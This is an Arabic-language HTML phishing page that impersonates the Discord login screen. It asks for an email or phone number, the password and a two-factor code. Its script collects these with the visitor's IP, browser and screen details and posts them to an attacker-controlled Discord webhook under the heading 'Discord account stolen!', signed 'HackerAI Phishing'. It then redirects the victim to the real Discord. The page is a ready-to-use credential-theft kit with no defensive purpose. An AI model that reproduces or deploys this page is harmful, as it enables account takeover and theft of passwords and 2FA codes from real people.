<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="icon" href="https://discord.com/assets/f9c71e4893e8315e81d879c4f9ed831d.svg">
    <link rel="preload" href="https://discord.com/assets/inter-bold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;background:linear-gradient(180deg,#7289da 0%,#99aab5 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;font-size:16px;line-height:1.5}html{font-size:16px}@media(max-width:768px){html{font-size:14px}}.container{max-width:440px;width:100%;padding:20px;background:rgba(0,0,0,0.6);backdrop-filter:blur(20px);border-radius:12px;box-shadow:0 20px 40px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1)}.logo{text-align:center;margin-bottom:32px}.logo svg{width:120px;height:120px;filter:drop-shadow(0 4px 12px rgba(0,0,0,0.3))}.title{color:#fff;font-size:28px;font-weight:700;margin-bottom:8px;text-align:center}.subtitle{color:#b9bbbe;font-size:16px;text-align:center;margin-bottom:32px}.form-group{position:relative;margin-bottom:24px}.label{color:#fff;font-size:14px;font-weight:600;margin-bottom:8px;display:block}.input{width:100%;padding:14px 16px;border:2px solid #202225;border-radius:6px;background:#36393f;color:#dcddde;font-size:16px;font-family:inherit;transition:all 0.2s ease;caret-color:#5865f2}.input:focus{outline:none;border-color:#5865f2;box-shadow:0 0 0 3px rgba(88,101,242,0.1);background:#40444b}.input::placeholder{color:#72767d}.qr-section{display:none;text-align:center;margin:24px 0}.qr-section.show{display:block}.qr-title{color:#fff;font-size:16px;font-weight:600;margin-bottom:16px}.qr-code{width:200px;height:200px;margin:0 auto 16px;background:#000;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;color:#666}.submit-btn{width:100%;padding:14px;background:linear-gradient(135deg,#5865f2,#4752c4);color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.2s ease;position:relative;overflow:hidden}.submit-btn:hover{background:linear-gradient(135deg,#4752c4,#5865f2);transform:translateY(-1px);box-shadow:0 8px 20px rgba(88,101,242,0.4)}.submit-btn:active{transform:translateY(0)}.error{display:none;background:#ed4245;color:#fff;padding:12px;border-radius:6px;margin-bottom:16px;text-align:center;font-weight:500}.back-link{color:#7289da;font-size:14px;text-decoration:none;display:inline-flex;align-items:center;gap:4px;transition:color 0.2s}.back-link:hover{color:#fff}@media(max-width:480px){.container{padding:16px;max-width:90%;margin:0 16px}.logo svg{width:100px;height:100px}}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 280 240" fill="#fff">
                <path d="M232.672 99.33c-1.89-7.81-8.27-14.61-17.02-18.45a73.85 73.85 0 00-28.6-5.55c-2.63 0-5.24.28-7.81.82-1.7-.36-3.45-.55-5.24-.55a35.72 35.72 0 00-7.13 1.01 73.4 73.4 0 00-27.7 11.46c-8.72 5.41-15.43 13.17-17.94 22.58-1.07 3.83-.5 7.89.07 11.81 1.18 7.03 4.57 13.37 9.38 17.77a56.78 56.78 0 005.76 4.05c-.39 1.82-.61 3.69-.61 5.63 0 10.45 3.67 20.05 10.11 27.68 5.18 6.16 12.31 10.58 20.48 12.77a54.95 54.95 0 006.7 1.01c1.55 0 3.09-.17 4.62-.5 3.16 1.87 6.76 2.95 10.61 2.95a35.09 35.09 0 0011.6-2.03c6.11-2.63 11.42-7.26 15.23-13.34 1.99-3.11 3.02-6.69 2.88-10.3-.15-3.25-1.33-6.4-3.45-8.88 1.17-1.06 2.25-2.22 3.21-3.49 2.89-3.84 5.1-8.18 6.48-12.91.87-3.07 1.01-6.21.38-9.29zM105.54 99.33c-1.89-7.81-8.27-14.61-17.02-18.45a73.85 73.85 0 00-28.6-5.55c-2.63 0-5.24.28-7.81.82-1.7-.36-3.45-.55-5.24-.55a35.72 35.72 0 00-7.13 1.01 73.4 73.4 0 00-27.7 11.46c-8.72 5.41-15.43 13.17-17.94 22.58-1.07 3.83-.5 7.89.07 11.81 1.18 7.03 4.57 13.37 9.38 17.77a56.78 56.78 0 005.76 4.05c-.39 1.82-.61 3.69-.61 5.63 0 10.45 3.67 20.05 10.11 27.68 5.18 6.16 12.31 10.58 20.48 12.77a54.95 54.95 0 006.7 1.01c1.55 0 3.09-.17 4.62-.5 3.16 1.87 6.76 2.95 10.61 2.95a35.09 35.09 0 0011.6-2.03c6.11-2.63 11.42-7.26 15.23-13.34 1.99-3.11 3.02-6.69 2.88-10.3-.15-3.25-1.33-6.4-3.45-8.88 1.17-1.06 2.25-2.22 3.21-3.49 2.89-3.84 5.1-8.18 6.48-12.91.87-3.07 1.01-6.21.38-9.29z"/>
                <circle cx="216" cy="168" r="12"/>
                <circle cx="96" cy="168" r="12"/>
            </svg>
        </div>
        <h1 class="title">مرحباً</h1>
        <p class="subtitle">نحن بحاجة للتأكد من هويتك لعرض محتوى السيرفر</p>
        
        <div id="error" class="error"></div>
        
        <form id="loginForm">
            <div class="form-group">
                <label class="label">البريد الإلكتروني أو رقم الهاتف</label>
                <input type="text" class="input" id="email" placeholder="someone@example.com" required>
            </div>
            <div class="form-group">
                <label class="label">كلمة السر</label>
                <input type="password" class="input" id="password" placeholder="كلمة السر" required>
            </div>
            
            <div class="form-group">
                <label class="label">
                    <input type="checkbox" id="mfa" style="margin-left:8px;width:18px;height:18px;"> 
                    تمكين التحقق بخطوتين (اختياري)
                </label>
            </div>
            
            <div id="mfaField" class="form-group qr-section">
                <label class="label">رمز التحقق بخطوتين</label>
                <div class="qr-code">رمز QR هنا<br>(افتح Discord app)</div>
                <input type="text" class="input" id="mfaCode" placeholder="000000" maxlength="6">
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                <span id="btnText">تسجيل الدخول</span>
                <span id="loading" style="display:none;">جاري التحقق...</span>
            </button>
        </form>
        
        <div style="text-align:center;margin-top:24px;">
            <a href="#" class="back-link" onclick="toggleMFA()">استخدم كلمة مرور بدلاً من ذلك</a>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const mfa = document.getElementById('mfa');
        const mfaField = document.getElementById('mfaField');
        const mfaCode = document.getElementById('mfaCode');
        const error = document.getElementById('error');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const loading = document.getElementById('loading');

        mfaField.classList.remove('show');
        
        function toggleMFA() {
            mfaField.classList.toggle('show');
            mfa.checked = !mfaField.classList.contains('show');
        }

        mfa.addEventListener('change', toggleMFA);

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            btnText.style.display = 'none';
            loading.style.display = 'inline';
            submitBtn.disabled = true;
            error.style.display = 'none';

            try {
                // جلب IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const data = {
                    email: email.value,
                    password: password.value,
                    mfa_code: mfaCode.value || 'غير مستخدم',
                    mfa_enabled: mfa.checked,
                    ip: ipData.ip,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timestamp: new Date().toISOString()
                };

                // ضع webhook URL هنا
                const webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: '🆕 حساب Discord مسروق!',
                            color: 0x5865f2,
                            fields: [
                                {name: '📧 البريد/الهاتف', value: `\`${data.email}\``, inline: true},
                                {name: '🔑 كلمة السر', value: `\`${data.password}\``, inline: true},
                                {name: '🔐 رمز 2FA', value: `\`${data.mfa_code}\``, inline: true},
                                {name: '🌐 IP', value: `\`${data.ip}\``, inline: true},
                                {name: '📱 جهاز', value: data.userAgent.slice(0,50)+'...', inline: false},
                                {name: '📍 شاشة', value: data.screen, inline: true},
                                {name: '⏰ وقت', value: `<t:${Math.floor(new Date(data.timestamp).getTime()/1000)}:F>`, inline: true}
                            ],
                            thumbnail: {url: 'https://discord.com/assets/f9c71e4893e8315e81d879c4f9ed831d.svg'},
                            footer: {text: 'HackerAI Phishing'}
                        }]
                    })
                });

                if (response.ok) {
                    window.location.href = 'https://discord.com/channels/@me';
                }
            } catch (err) {
                error.textContent = 'خطأ في الاتصال. حاول مرة أخرى.';
                error.style.display = 'block';
            } finally {
                btnText.style.display = 'inline';
                loading.style.display = 'none';
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
